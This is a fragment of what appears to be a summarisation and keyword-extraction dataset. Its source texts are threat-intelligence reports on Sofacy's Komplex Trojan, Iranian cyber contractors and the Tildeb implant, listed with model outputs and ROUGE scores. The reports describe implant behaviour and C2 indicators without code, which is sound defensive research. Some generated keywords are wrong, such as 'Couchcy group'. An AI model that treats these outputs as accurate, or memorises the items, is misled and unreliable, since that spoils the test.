have any previously known activity associated with it, both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to Sofacy activity. The apple-iclouds[.]net domain is mentioned within a PwC Tactical Intelligence Bulletin that discussed a phishing campaign conducted by the Sofacy group. The itunes-helper[.]net domain is associated with separate activity discussed in Trend Micro\u2019s blog titled Looking Into a Cyber-Attack Facilitator in the Netherlands that included research on hosting providers used by Pawn Storm (Sofacy).The domain appleupdate[.]org does have one interesting correlation point, specifically involving the IP 185.10.58[.]170 that resolved this domain between April 2015 through April 2016. Researchers at BAE Systems provided Unit 42 the Komplex payload delivered through the exploitation of MacKeeper (Dropper SHA256: which used the IP address 185.10.58[.]170 within its configuration as a C2 server. This infrastructure overlap further strengthens the connection between the Komplex payload we discovered with the prior campaign using MacKeeper for delivery.The Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system \u2013 a move that showcases their continued evolution toward multi-platform attacks. The tool is capable of downloading additional files to the system, executing and deleting files, as well as directly interacting with the system shell. While detailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals related to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan. The Komplex Trojan revealed a design similar to Sofacy\u2019s Carberp variant Trojan, which we believe may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.While Unit 42 continues to research and track this threat, Palo Alto Networks customers are protected via the following:WildFire correctly identifies known Komplex executables as maliciousIPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block outbound C2 requests generated by the Komplex Trojan.Customers can track this Trojan via the Komplex tag in AutoFocus.Hashes: apple-iclouds[.]net thoughtsImia Familiya on September 27, 2016 2:06 AM saidNB google.com is blocked by national-level firewalls in some jurisdictions (the PRC, for example), which means Komplex wouldn\u2019t initiate a connection to its C2 servers from there, apparently \u2026 FWIWRobert Falcone on September 27, 2016 8:47 AM saidGood point, the Komplex Trojan would not be a viable tool to use in targeted attacks within regions that have Internet censorship that involves the blocking of google.com. This suggests that it is unlikely that the target of this attack was in one of these regions. On a side note, it would be interesting to see if future samples use different domains within the connectedToInternet to test for connectivity.Name *Email *WebsitePost CommentPrivacy Policy Legal Notices Site Index SubscriptionsCopyright \u00a9 2007-2013 Palo Alto Networks ", "generated_text": "the OS X operating system; OS X devices; the malware; a binder component; a second payload; a decoy document; the system; persistence; the Komplex dropper; a decoy document; subdomains; the Couchcy group; malware; APT28; Pawn Storm; Fancy Bear; Sednit; use; previously identified phishing campaign infrastructures; a new OS X Trojan; Palo Alto Networks; IP; detection; infrastructure; the same group; APT28; Pawn Storm; Fancy Bear; Sednit; infrastructure; light; malware; phishing campaigns; the threat actor; the group; the attackers.", "ref_text": "<START-1>Researchers from Palo Alto Networks discovered a new OS X malware named Komplex that is associated with the cyberespionage group Sofacy, also known as APT28 or Fancy Bear. Komplex has multiple components for installation and persistence. It starts with a binder that drops a second executable and opens a decoy PDF document. The second executable saves the Komplex payload and a launch agent plist to achieve persistence. The payload gathers system info and communicates with C2 servers using encrypted HTTP requests. It can download other files, execute commands, and inject code into processes. Komplex shares code similarities with Sofacy's Carberp Windows malware, including encryption algorithms and C2 communication methods. It also uses infrastructure linked to prior Sofacy activity. The malware appears to target individuals in the aerospace industry. The initial infection vector involved exploiting the MacKeeper antivirus tool. In summary, Komplex is a new OS X Trojan associated with the Sofacy group that uses multi-stage installation, shared infrastructure, and overlaps with Windows malware, indicating a cross-platform cyberespionage toolset. 2. If existing the process of the attack in this pdf, please extract it (use 1., 2., 3., etc.) . Here is an outline of the attack process described in the PDF: 1. Sofacy sends a phishing email with a weaponized Excel document or exploits MacKeeper to gain initial access. 2. The initial exploit or macro drops the Komplex binder component. 3. The binder saves the Komplex dropper and opens a PDF decoy document. 4. The dropper installs the full Komplex payload and creates a launch agent for persistence. 5. The payload gathers system info and communicates with C2 servers to receive commands. 6. Komplex can download more files, execute commands, inject code into processes per C2 instructions. 7. The C2 commands allow the threat actor full control over the compromised system. 8. Komplex maintains persistence by loading at system startup via the launch agent created by the dropper. In summary, the initial vector installs the binder, which escalates access for the dropper to deploy the full payload, completing the multi-stage installation and control process. <END-1>", "t5/keyword/hint_hit_precision": 0.3055555555555556, "t5/word/hint_hit_recall": 0.06705539358600583, "gpt3/lexical/rouge_rouge1": 0.3888888888888889, "gpt3/lexical/rouge_rouge2": 0.15450643776824033, "gpt3/lexical/rouge_rougeL": 0.23076923076923078, "gpt3/lexical/rouge_rougeLsum": 0.23076923076923078, "gpt3_generated_text": ["Unit 42 researchers have identified a new OS X Trojan, named Komplex, associated with the Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit. This malware targets individuals in the aerospace industry using the OS X operating system. Komplex shares similarities with another tool used by Sofacy on Windows systems. The Trojan consists of a binder component that saves a second payload and a decoy document to the system, as well as a Komplex dropper for persistence. The attackers exploit vulnerabilities in MacKeeper antivirus to deliver Komplex. Additionally, Komplex C2 domains overlap with phishing campaign infrastructures used by the Sofacy group. This discovery highlights the persistent threat posed by APT28 and the evolving tactics of this threat actor group."]}, {"split_name": "val", "sample_id": "val_130", "prompt_text": "Extract the keywords: CYBER THREAT ANALYSISIran\u2019s Hacker Hierarchy ExposedHow the Islamic Republic of Iran Uses Contractors and Universities to Conduct Cyber OperationsBy Levi Gundert, Sanil Chohan, and Greg Lesnewich Recorded FutureRecorded Future | www.recordedfuture.com | CTA-2018-0509Scope Note: Insikt Group conducted interviews with a former Iranian hacker with first-hand knowledge of the information shared and was living in Iran when he started one of Iran\u2019s first security forums. This source\u2019s commentary forms the basis for the background on the genesis of Iran\u2019s offensive cyber efforts. Additional research was facilitated with Recorded Future and by leveraging third- party metadata and open source intelligence (OSINT) techniques using a variety of tools. While we address historical background and precedent in the piece, the technical analysis regarding organizations and institutes in Iran\u2019s offensive cyber program is based on data collected from March 1, 2018 to April 30, 2018.Executive SummarySince at least 2009, the Islamic Republic of Iran has regularly responded to sanctions or perceived provocations by conducting offensive cyber campaigns. The Islamic Republic has historically preferred to use proxies or front organizations both in physical conflict \u2014 Hezbollah against Israel and Yemen rebels against Saudi Arabia \u2014 and cyberattacks to achieve their policy goals.Currently, Iran faces the prospect of negative economic impact via renewed sanctions. On May 8, 2018 President Trump announced that the United States would not renew the waivers on sanctions against Iran. The U.S will instead impose additional economic penalties , the combination of which amounts to a de facto U.S. withdrawal from the 2015 Joint Comprehensive Plan of Action (JCPOA) (commonly referred to as the \u201cIran nuclear deal\u201d.We assess, based on Iran\u2019s previous reactions to economic pressure, that with President Trump\u2019s exit from the JCPOA, Iran is likely to respond by launching cyberattacks on Western businesses within months, if not faster. Judging from historical patterns, the businesses likely to be at greatest risk are in many of the same sectors that were victimized by Iranian cyberattacks between 2012 and 2014 and include banks and financial services, government departments, critical infrastructure providers, and oil and energy.Key Judgments\u2022\u2022The Islamic Republic has abandoned its typically deliberate and methodical approach to cyber operations on only two known occasions, in 2012 and in 2014, when a quick reactionary response was required. We assess that when Iranian cyber operators respond to the U.S. withdrawal from the JCPOA that the operations will be staffed and executed by capable, but less trusted contractors.Further, we assess that staffing these operations with less trusted contractors could result in a scenario where the Islamic Republic has difficulty controlling the scope and scale of the destructive cyberattacks once they have begun.Recorded Future | www.recordedfuture.com | CTA-2018-0509\u2022\u2022Iranian cyber operations are administered via a tiered approach, where an ideologically and politically trusted group of middle managers translate intelligence priorities into segmented cyber tasks which are then bid out to multiple contractors. This creates a quasi-capitalistic system that pits contractors against each other for influence with the Iranian government.The Islamic Republic operates with embedded paranoia, where ultimately, no one can be trusted. The situation creates unique trade-offs in Iran\u2019s government-sanctioned offensive cyber campaigns; individuals with demonstrated adherence to the government\u2019s ideology and individuals with the greatest offensive cyber skills are almost always mutually exclusive.\u2022 Based on our source\u2019s conversations with other hackers inIran, there are over 50 estimated contractors vying for Iranian government-sponsored offensive cyber projects. Only the best individuals or teams succeed, are paid, and remain in business.\u2022\u2022Insikt Group analyzed internet traffic relating to various institutes affiliated with the Iranian cyber ecosystem from March 1, 2018 to April 30, 2018. As this is the first profiling of Iranian internet activity for these institutes, we cannot determine whether the suspicious activity we analyzed was in preparation of the U.S. announcement.According to Insikt Group\u2019s source, to find and retain the best offensive cyber talent, Iranian government contractors are forced to mine closed-trust communities. The links between the forums and contractors may illustrate that the trust communities begin with the Iranian security forums.The History of Iranian Geopolitical Response and the Nuclear Agreement Decision Editor\u2019s Note: Where applicable, information in this section was provided by a former Iranian hacker with direct access to the information provided. Based on additional corroboration, we assess high confidence in this information. We refer to this individual as \u201cInsikt Group\u2019s source\u201d in other sections where their information is cited.Since 1979, Iran\u2019s reactions to perceived Middle Eastern adversaries\u2019 foreign policy has been a study in the use of proxies. Specifically, Israel, Saudi Arabia, United States, and Iraq have been frequent targets of Iranian- funded military actions, most recently through Houthi rebels in Yemen, and Hezbollah everywhere else.Since 2009, Iran has developed proxies in the cyber domain to partially obfuscate government fingerprints from foreign attacks. Subsequent to starting a cyber operations program in 2009, the Iranian government had an immediate need to use the program in the fall of 2012 after U.S. President Obama imposed severe financial sanctions on Iran, including removing Iran from the SWIFT money transfer system.Recorded Future | www.recordedfuture.com | CTA-2018-0509According to Insikt Group\u2019s source, the Iranian government authorized denial-of-service attacks on America\u2019s largest financial services companies as an immediate response to the sanctions in a campaign dubbed Operation Ababil. A quick response was top priority, so time and planning were forgone luxuries for the Iranian government. Instead, the Iranian government opted for speed and the most capable actors, regardless of demonstrated ideology.Similarly, a year later in the fall of 2013, Sheldon Adelson (the CEO of Sands Corporation) publicly suggested that the United States should attack Iran with an atomic weapon. In February 2014, Iran launched a destructive attack on the Sands Las Vegas Corporation that caused significant network damage. This was the second public Iranian attack campaign on an American business, where the response called for speed over time and preparation.The Iranian attacks in 2012 and 2014 were in contrast to the relatively slow and methodical work of APT 33, APT 34, and APT 35, developing custom malware, targeting data exfiltration from strategic intelligence targets such as U.S. military contractors, Middle East energy companies, and university research networks.Comparing Iranian campaigns \u2014 methodical versus reactionary.Recorded Future | www.recordedfuture.com | CTA-2018-0509Building a National Capability \u2014 History and Relationships Between ProxiesThe Iranian Revolution replaced the Persian monarchy and transitioned the Shah\u2019s power to the Islamic Republic, led by Ayatollah Ruhollah Khomeini. Loyalty to the resulting theocracy was defined by alignment to the Supreme Leader\u2019s moral precepts.The new leaders of Iran also established an intelligence and security organization, the Islamic Revolutionary Guard Corps (IRGC), \u201ccharged with defending the Islamic Republic against internal and external threats.\u201d Currently, the IRGC is Iran\u2019s premier security organization and possesses an army, navy, and air force, and manages \u201cIran\u2019s ballistic missile arsenal and irregular warfare operations through its elite Quds Force and proxies such as Hezbollah.\u201dThe IRGC has a vast domestic information security and monitoring mandate, as well as broad foreign mission, and has been linked to cyberattacks against Western institutions since at least 2011.According to Insikt Group\u2019s source, during the 2009 Green Revolution, Gerdab.ir emerged as the IRGC\u2019s domestic hacking group tasked with targeting opposition news websites and individuals considered immoral by the regime. Iranian hackers targeting Iranian government resources (one example was defacing Khamanei.ir) were identified by Gerdab and imprisoned. Gerdab continues to act as the Iranian government\u2019s internal censor.Following the Green Revolution, the Iranian government considered adding a formal offensive cyber component to its existing intelligence apparatus, and was forced to address a personnel problem. Iran needed a talented, but politically and religiously reliable workforce. Stuxnet and scientist assassinations reminded Iran of the efficacy of Mossad and CIA programs, and according to Insikt Group\u2019s source, fervent religious ideology was the only way to demonstrate loyalty and build trust.The emergence of the Iranian Cyber Army (ICA) as an extension of the IRGC was an initial attempt by the Islamic Republic at conducting internationally focused operations. These operations were a departure from Gerdab\u2019s focus on maintaining domestic moral values and defending government rhetoric. In 2011, the IRGC\u2019s ICA formed the foundation of the Khaybar Center for Information Technology. According to a former IRGC cyber commander, the Khaybar Center was established in 2011 and has been linked to a number of attacks against the United States, Saudi Arabia, and Turkey.Even today, the balance between ideology and cyber skills remains problematic. One example of the conflict between ideology and skill was Mohammad Hussein Tajik, a former cyber commander within the IRGC. According to Insikt Group\u2019s source, Tajik\u2019s father maintained a strong religious background and was a veteran of Iran\u2019s ministry of intelligence. Yet Tajik was arrested and killed because the Iranian government feared that Tajik was not ideologically aligned and posed a betrayal and flight risk.Recorded Future | www.recordedfuture.com | CTA-2018-0509Following the Green Revolution, Iran\u2019s government needed to quickly improve its cyber capabilities, but according to Insikt Group\u2019s source, the talent was primarily young and focused on financial benefits. This motivation bred government mistrust, as the Islamic Republic feared that the financially motivated could be bought by foreign intelligence services. Additionally, many of the original Iranian hackers responsible for mass defacements hated authority and lacked the discipline necessary for government work.According to Insikt Group\u2019s source, the government answer was a tiered approach, with a network of people unofficially associated with the IRGC and Iranian government \u2014 a type of ideologically aligned middle management \u2014 that were loyal to the regime and demonstrated sufficient religious commitment. This middle tier translated intelligence priorities into segmented cyber tasks which were then bid out to multiple contractors. Sometimes the contractors would compete with each other, sometimes they would work together, but payment was only made once the objective was completed. The result was (and presently remains) a quasi-capitalistic system that pitted contractors against each other for influence with the Iranian government.In the Islamic Republic, influence can lead to security and wealth, but it can also lead to a false sense of security (no one is above being imprisoned and questioned at any given time). Thus, contractors must learn to play the game \u2014 enough surface-level adherence to the regime\u2019s ideology \u2014 to gain temporary reprieves from suspicion long enough to be given contracted work. To the Iranian government, ideology is more important than skills. Deep belief in the Ayatollah\u2019s precepts and the government\u2019s goals helps to avoid defections and traitors.Obfuscating Iranian government involvement in offensive campaigns.Recorded Future | www.recordedfuture.com | CTA-2018-0509Today, based on ongoing contact between Insikt Group\u2019s source and Iranian hackers, it is estimated that there are over 50 organizations vying for government-sponsored offensive cyber projects. Only the best teams succeed, are paid, and remain in business. The government does its best to compartmentalize \u2014 one job might be creating a remote code exploit (RCE) for a popular software application, while another job might be using the RCE and establishing persistent unauthorized access. Two different contractors (or more) are typically required to complete the government-defined objective.Public knowledge has also established that Iranian academic institutions play a contractor-like role. Specific examples include Shahid Beheshti University (SBU) and the Imam Hossein University (IHU), which have comprehensive science and technology departments attracting some of the best academic talent in Iran. In fact, the SBU has a specific cyberspace research institute dedicated to such matters. In fact, the SBU has a specific cyberspace research institute dedicated to such matters, and the IHU was founded by the IRGC.As the Mabna Institute indictments highlight, despite the lifting of sanctions and an appetite to re-engage with the international community, Iran has continued a subversive and aggressive global cyber operations campaign. This ongoing campaign, which targets universities for scientific and technological intellectual property theft, demonstrates a fundamental lack of trust in the international agreements, including the Joint Comprehensive Plan of Action (JCPOA).Relationship Between the Iranian Government, Contractors, and Security ForumsClearsky, FireEye, Symantec, and PhishLabs have all performed significant research on Iranian nation-state-sponsored campaigns that provide historical insight into technical capabilities and relationships between the Iranian government and contractors.The work of the aforementioned security companies and recent U.S. Department of Justice indictments provides consistent evidence that Iranian government-sponsored offensive campaigns are executed by contractors.FireEye disclosed that the Nasr Institute was an APT 33 contractor in an operation that used publicly available backdoors and remote access trojans. The handle \u201cxman_1365_x\u201d (self-identified on security forums as Mahdi Honarvar) was found by FireEye in malware artifacts, which open sources linked to the Nasr Institute. Previously, Nasr Institute had been associated with Operation Ababil\u2019s distributed denial-of-service attacks against American banks, an organization which a U.S. Department of Justice indictment confirms had been hired to build attack infrastructure by the Iranian government.The actor xman_1365_x was then linked to a security company called Kavosh Security via OSINT by Iran Cyber News Agency. The actor was linked to a destructive operation, which used NewsBeef and StoneDrill malware families. According to Kaspersky, the latter data wiping operation targeted sectors across Saudi Arabia and Europe.Recorded Future | www.recordedfuture.com | CTA-2018-0509Command and control (C2) domains used by StoneDrill and NewsBeef in Kaspersky\u2019s findings were found to share an SSL certificate, which surfaced an additional three domains in research by the Iran Cyber News Agency. WHOIS information was then connected via open sources to Imam Hossein University (IHU). IHU was named in sanctions by the U.S. Treasury \u201cfor providing, or attempting to provide technological, or other support for and services in support of the IRGC.\u201dAdditional publicly known Iranian contractors include ITSecTeam (ITSEC) and Mersad Company, also linked to Operation Ababil.The links between the Iranian government and contractors are well documented; however, the identity of specific groups and individuals within the Iranian government and IRGC responsible for offensive cyber campaigns is murky, as is the relationship between contractors and security forums.Yet, our research and analysis suggest that Iranian security forums may play a role in staffing and knowledge sharing for Iranian contractors. First, FireEye referenced the publicly available ALFA TEaM Shell in APT33 spear phishing email campaigns. The ALFA Shell is discussed in multiple web locations, including Ashiyane and Iranian Dark Coders Team Forum.ALFA TEaM shell history.Recorded Future | www.recordedfuture.com | CTA-2018-0509Second, xman_1365_x created an Ashiyane profile on August 8, 2010, allegedly not long after Ashiyane temporarily became the primary security forum in Iran, following Behrooz Kamalian\u2019s visit to prominent cleric, Ayatollah Naser Makarem Shirazi.xman_1365_x created an Ashiyane profile in 2010.Finally, according to Insikt Group\u2019s source, Iranian contractor ITSEC specifically employed hackers from the respective online forums Simorgh and Delta Security. Further, Hossein Asgari, a self-proclaimed Iranian hacker, managed the Simorgh forum and worked with his father, who was employed by the IRGC.Source: url Future | www.recordedfuture.com | CTA-2018-0509Zone-h captured website defacements committed by Hossein AsgariSource: url to Insikt Group\u2019s source, to find and retain the best offensive cyber talent, Iranian government contractors are forced to mine closed-trust communities. The links between the forums and contractors may illustrate that the trust communities begin with the Iranian security forums.Analyzing Iranian Cyber Institute Internet TrafficInsikt Group analyzed internet traffic relating to various institutes affiliated with the Iranian cyber ecosystem from March 1, 2018 to April 30, 2018. Our goal was to determine whether any of these institutes had forecasted Iran\u2019s intentions in cyberspace leading up to the U.S. decision to withdraw from the 2015 JCPOA.This is Insikt Group\u2019s first profiling of internet activity for Iranian cyber institutes. While we cannot assess whether this level of activity is typical or not, monitoring it over time to determine changes in response to international pressure could be revealing.Cyberspace Research Institute of IranIran\u2019s Cyberspace Research Institute (CSRI) is a research center affiliated with the prestigious Shahid Beheshti University in Iran. The institute commands a significant proportion of the university\u2019s allocated IP space, with no fewer than eight /24 IP ranges registered to the CSRI in Iran, ranges.We discovered over 400 previously unreported SSH sessions between CSRI ranges and Spanish government and university networks from April 4, 2018 to April 9, 2018. These exchanges involved the transfer of a large volume of data between the two networks. The Spanish networks resolved to departments supporting the digital transformation of Spanish public services and multi-disciplined universities. Direct network connectivity between the Iranian and Spanish institutions demonstrates that they either have a deep academic relationship and are sharing data with one another, or the large transfer of data from the Spanish institutes is unwarranted. It is unlikely that CSRI would have a valid business interest with Spanish government departments, so the large volume of data transferred between the two networks over such a short period of time is a conspicuous indicator of possibly malicious activity.Throughout April, Iran\u2019s CSRI simultaneously demonstrated an increased interest in the Philippine Department of Science & Technology (DOST). Similar to the Spanish network interactions, very large data volumes were exchanged between the two networks, denoting strong interest.This level of engagement and interaction, particularly in light of the reduction of sanctions, and the thawing of relations between Iran and the West following the 2015 JCPOA, was expected between academia. In fact, in 2015 and 2017, Philippine and Spanish universities agreed to expand scientific cooperation with Iranian institutions. However, given CSRI\u2019s background, Iran\u2019s demonstrated interest in using cyber operations to steal academic and intellectual property, and our evidence of ongoing campaigns targeting universities for theft worldwide, we assess that this activity between CSRI and these Spanish and Philippine universities may be malicious.Recorded Future | www.recordedfuture.com | CTA-2018-0509CSRI was also observed in a large number of events dispatching the Parsijoo bot to crawl websites of interest. According to Wikipedia, Parsijoo.ir is the second most popular search engine in Iran after Google and it uses the Parsijoobot to crawl websites for indexing purposes. During our research, we noted repeated crawls of a specialist Canadian-Iranian immigration website, www.itc-canada[.]com, using Parsijoo bot from CSRI IP ranges. The crawls were observed throughout our data period from early March continuing right through to the end of April, suggesting a strong, persistent interest in this particular site.Finally, we identified CSRI interacting with IPs registered to Ravand Cybertech Inc. Ravand Cybertech offers, via its website ravand[.]com, cloud hosting solutions, among other services. Ravand Cybertech has strong ties to the Iranian regime. Historically, it hosted the website of the conservative news agency Fars which is affiliated with the Iranian military. The company\u2019s registered IP ranges sit under AS12212 with the following Ministry of Intelligence Services (MOIS) agent, Massoud Khodabandeh, in a disinformation campaign conducted in Western media. The campaign attempted to discredit and demonize the main Iranian opposition party, the People\u2019s Mojahedin Organization of Iran/Mojahedin-e Khalq (PMOI/MEK). According to an opinion piece written for The Hill, the websites were found by the Pentagon to be created by order from Tehran. Ravand Cybertech was identified as being an \u201cIranian state-run\u201d company, which hosted fake news sites aimed at disseminating Iranian propaganda to undermine the efforts of Iranian-American lobbyists.Based on the volume of activity observed during our research, we assess the CSRI may be engaged in supporting the malicious disinformation activities of Ravand Cybertech.Imam Hossein University (Imam Hussein University)The Imam Hossein Comprehensive University (IHU) is an Iranian university based in Tehran that is affiliated with the Iranian Revolutionary Guard Corps (IRGC), the Iranian Ministry of Science, Research and Technology, and the Iranian Ministry of Defense and Armed Forces Logistics.Recorded Future | www.recordedfuture.com | CTA-2018-0509Our research focused on the publicly noted IP ranges for the university, higher educational establishments and specific government departments. In fact, two of the same Spanish establishments exchanged high data volumes with the IHU source range IPs.Further web browsing activity from IHU ranges was noted to the website of a U.S.-based multinational engineering software company, Gamma Technologies. The browsing activity was centered on its GT-SUITE software. Gamma Technologies specializes in the development of simulation software for a wide variety of worldwide industries, including power generation.Mabna InstituteAs previously detailed, the Mabna Institute was publicly identified in an FBI indictment as a front company engaged in hostile state-sponsored cyberespionage on behalf of the Iranian state. Our OSINT research identified a single domain, mabna-ins[.]ir, which could correspond to the group. The domain was previously hosted on an Iranian IP 5.144.130[.]23 and since April 22, 2017, points at German VPS IP 144.76.87[.]86. This VPS also hosts over 2,000 other domains, most of which are .ir domains.Recorded Future | www.recordedfuture.com | CTA-2018-0509Source: mabna-ins[.]irIntent, Scenarios for Retaliation, and RecommendationsAccording to the terms of the JCPOA, Tehran agreed to restrictions on its nuclear weapons program in exchange for sanctions relief. However, various provisions of the accord expire at different times over the next 25 years, with some expiring as soon as 2025.On May 8, 2018, President Trump decided not to renew the waivers suspending some U.S. sanctions against Iran and initiated a de facto U.S. withdrawal from the agreement. As a result of this action, we assess that Iran will likely respond quickly by launching destructive attacks on American, European, and rival nation (countries such as Saudi Arabia and Israel) businesses.Conversely, Iran may also retaliate (exclusively or in conjunction with destructive attacks) through cyber proxies in more methodical and sustained campaigns. Given the impact of re-applied and expanded economic sanctions, it is likely that American, European, and rival nation businesses will also be targeted with more sustained destructive attacks.Recorded Future | www.recordedfuture.com | CTA-2018-0509As documented above, when pursuing quick-turn cyber operations, the Iranian regime will weigh religious and political reliability against offensive skills. The best operators are not always the most devout or loyal to the regime and we assess that, in this case, the IRGC may forgo careful contractor selection and planning in an attempt to deliver a destructive attack within a short period of time.Further, our research indicates that because of the need for a quick response, the Islamic Republic may utilize contractors that are less politically and ideologically reliable (and trusted) and as a result, could be more difficult to control. It is possible that this dynamic could limit the ability of the government to control the scope and scale of these destructive attacks once they are unleashed.Western businesses should closely monitor geopolitical events initiated by the United States or Europe that affect Iran. As demonstrated above, Western businesses are the logical victims of Iranian retaliation for perceived American policy transgressions; specifically businesses in financial services, government departments, critical infrastructure providers, and oil and energy sectors.In addition to carefully monitoring Iranian geopolitical developments, tracking emerging tactics, techniques, and procedures (TTPs) on Ashiyane, specifically, is wise for any Western commercial threat intelligence program to determine the efficacy of existing security controls.Recorded Future | www.recordedfuture.com | CTA-2018-0509About Recorded Future Recorded Future arms security teams with the only complete threat intelligence solution powered by patented machine learning to lower risk. Our technology automatically collects and analyzes information from an unrivaled breadth of sources and provides invaluable context in real time and packaged for human analysis or integration with security technologies.\u00a9 Recorded Future, Inc. All rights reserved. All trademarks remain property of their respective owners.www.recordedfuture.com@RecordedFuture ", "generated_text": "The report; Insikt Group; the Islamic Republic of Iran; the cyber challenges; 2015; sanctions; proxies; front organizations; government departments; oil; energy; 2013; 2014; the cyber operations; a tiered approach; government contractors; universities; over 50; cyber tasks; the Iranian cyber ecosystem; over 50; the best individuals; teams; businesses; the U.S. withdrawal; the nuclear deal; the cyberattacks; attribution; attribution; attribution; cyberattacks; victims; July; 2018; economic sanctions; Iran; the US; an individual; actors; the threat; control; organizations; the US; scenarios.", "ref_text": "<START-1>The report profiles Iran's offensive cyber capabilities and contractor ecosystem. It assesses that Iran will likely retaliate with cyberattacks on Western businesses in response to the U.S. withdrawal from the Iran nuclear deal. Iran has historically used proxies and contractors to conduct cyber operations that align with regime interests but offer some deniability. A tiered approach is used - trusted middlemen translate intelligence priorities into cyber tasks that are bid out to contractors. An ideologically aligned workforce is prioritized over pure technical capability. There are an estimated 50+ contractors competing for Iranian cyber projects. The IRGC and academic institutes also participate. Analysts looked at internet traffic of Iranian cyber institutes from March-April 2018. Suspicious activity was seen between Shahid Beheshti University ranges and Spanish/Philippine networks, and with a propaganda-linked cloud provider. When rapid cyber retaliation is required, Iran may use less trusted contractors, potentially limiting their control over the scope of attacks. Infrastructure and energy companies should monitor for fallout from Iranian geopolitical developments. <END-1>", "t5/keyword/hint_hit_precision": 0.2727272727272727, "t5/word/hint_hit_recall": 0.10975609756097561, "gpt3/lexical/rouge_rouge1": 0.47262247838616717, "gpt3/lexical/rouge_rouge2": 0.19130434782608696, "gpt3/lexical/rouge_rougeL": 0.2593659942363113, "gpt3/lexical/rouge_rougeLsum": 0.2593659942363113, "gpt3_generated_text": ["The report by Insikt Group delves into the cyber challenges posed by the Islamic Republic of Iran, particularly in response to sanctions and geopolitical tensions. The Iranian government has historically utilized proxies and front organizations for both physical conflicts and cyber operations. With the U.S. withdrawal from the 2015 nuclear deal and the imposition of sanctions, Iran is likely to retaliate through cyberattacks on Western businesses, especially in sectors like government departments, oil, and energy. The Iranian cyber operations are structured in a tiered approach, where government contractors bid on segmented cyber tasks. Over 50 contractors are vying for these projects, with only the best individuals or teams succeeding. The report highlights the challenges in controlling the scale and scope of destructive cyberattacks, especially when less trusted contractors are involved. The analysis of internet traffic related to Iranian cyber institutes from March to April 2018 provides insights into potential preparations for cyber operations in response to the U.S. announcement. Overall, the report underscores the attribution and potential impact of Iranian cyberattacks on businesses in the coming months."]}, {"split_name": "val", "sample_id": "val_131", "prompt_text": "Extract the keywords: File and Code Characteristics The implant has the following file characteristics:\uf0b7 File name: clocksvc.exe \uf0b7 Compiled as 32-Bit \u2013 Console Windows executable \uf0b7 Accepts command-line arguments \uf0b7 Compilation timestamp: October 3, 2000 \u2013 21:01:55 \uf0b7 File size: 57344 bytesIt has been 18 years since the implant was compiled, but it\u2019s possible that it may have been created earlier considering the time it took to develop and the number of iterations it might have gone through. Although we cannot say that the compilation timestamp is accurate, it is unlikely to be a forged value considering the environment it targets and the compiler version used. Moreover, the implant is developed using the C language, with the C++ part restricted to the Windows Foundation Class (MFC) library, that is, mfc42.dll. The MFC library is primarily used for network communications and compiled using Microsoft Visual C++ v6.0.Tildeb\u2019s code is not obfuscated in any way and thus has no anti-disassembly and anti-debugging features, encrypted strings, or similar obfuscation techniques.Infection Vector and Relation to Other Files Since Tildeb is positioned as a stand-alone implant, we couldn\u2019t link it to any other files from the leak even while searching for various artifacts from the implant. However, a search by filename in the rest of the leak\u2019s dump shows the table \u201cProcessInformation\u201d in the database file, \\windows\\Resources\\Ops\\Databases\\SimpleProcesses.db, with the following:NameCommentclocksvc.exe*** PATROLWAGON ***Type SAFEIt is likely that \u201cPATROLWAGON\u201d is a moniker for an unknown exploitation framework or some other tool that works in conjunction with Tildeb that is yet to be discovered. The DB Table \u201cProcessInformation\u201d contains a variety of legitimate and known process names and different types. \u201cType\u201d takes either of the following values: NONE, MALICIOUS_SOFTWARE, SECURITY_PRODUCT, CORE_OS, ADMIN_TOOL, and SAFE. Of interest is the SAFE type, which shows process names that map to known exploitation frameworks and tools such as UNITEDRAKE, MOSSFERN, EXPANDINGPULLY, GROK, FOGGYBOTTOM, MORBIDANGEL, and others.It is unknown how Tildeb gets delivered onto a targeted system, but it would not be surprising if it\u2019s delivered via lateral movement or through some of the other exploitation frameworks that have RCE modules targeting Windows NT.1Command Line Options Tildeb is a console-based executable that can take command-line arguments. Since it doesn\u2019t use MFC\u2019s WinMain function, it instead calls AfxWinInit directly to initialize MFC upon execution. It successfully terminates itself if it fails.The implant can take argument 0, 1, 2, 3, or 4 (excluding argv[0]) at once. Each serves a specific purpose:\uf0b7 Case \u2013 0: If executed without any arguments, it uses the hardcoded IP address137[.]140[.]55[.]211 and port 25 to communicate with its C&C server.\uf0b7 Case \u2013 1: It expects an IP/domain address to connect to as the C&C server. \uf0b7 Case \u2013 2: The first argument is the same as in case \u2013 1. The second argument is the port numberto connect over.\uf0b7 Case \u2013 3: The first two arguments are the same as in case \u2013 2. The third argument is the port ituses for creating a Transmission Control Protocol (TCP) socket in listening mode for accepting an ingress connection in case the egress connection fails (cases: 0, 1, 2). The default listening port is hardcoded to 1608.\uf0b7 Case \u2013 4: The first three arguments are the same as in case \u2013 3. The fourth argument takes the value -ju that sets a global variable to 1. This instructs the implant to attempt elevating privileges in order to inject code into a Microsoft Exchange Server process.Cleanup Thread and Main Process Cleanup Code After checking for any command line arguments, Tildeb will sleep for 4.096 seconds. This is followed by setting a global variable, which we\u2019ve referred to as up_time, with the current time since the Epoch (in seconds).It then initializes and sets two Security Descriptors discretionary access control lists (DACL) to NULL, which allows access to two objects. One is a mailslot it creates under the name \\\\.\\mailslot\\c54321. The handle of this object is set as such so it is not inheritable by a new process. Another is a temporary file it creates on the system under the name tmp<uuuu>.tmp. The handle of this object is set as such so it is inheritable by a new process.It subsequently attempts to initialize Windows Sockets and terminates itself if it fails to do so. Otherwise, it continues to create a global mutex object under the name nowMutex. The mutex is not created for ensuring only one instance of itself is running. In fact, there may be more than one instance running at the same time. The mutex is created solely for thread synchronization, that is, for signaling to the cleanup thread to acquire it. A mutex is a mutually exclusive object, and only one thread can own it at a time.Tildeb has a fail-aware thread responsible for housecleaning upon failure in specific operations in the code throughout the program lifetime. We\u2019ve referred to this thread as the cleanup_thread.The synchronization between the main process thread and the cleanup_thread happens as follows. Initially, the main process thread is the owner of the mutex object nowMutex, which is in a non-signaled state at this point. At the same time, the cleanup_thread waits to acquire it indefinitely. For cleanup_thread to acquire the mutex, the owning thread releases it via the ReleaseMutex() application programming interface (API). When this happens, the mutex object becomes signaled and the 